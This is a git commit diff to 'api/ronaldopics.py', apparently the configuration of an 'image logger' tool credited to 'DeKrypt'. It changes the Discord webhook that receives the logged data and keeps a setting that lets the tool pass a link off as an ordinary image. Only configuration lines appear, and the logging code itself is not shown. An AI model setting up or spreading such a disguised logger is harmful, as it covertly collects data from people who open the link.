7da6ca4bbc38917297c5b6182e32a0f9ccb72703
lzzii <142037280+lzzii@users.noreply.github.com>
2023-08-11 19:18:28 +0200

    Update ronaldopics.py

--- api/ronaldopics.py
+++ api/ronaldopics.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://discord.com/api/ronaldopics",
     "image": "https://ronaldopics.vercel.app/api/ronaldopics", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
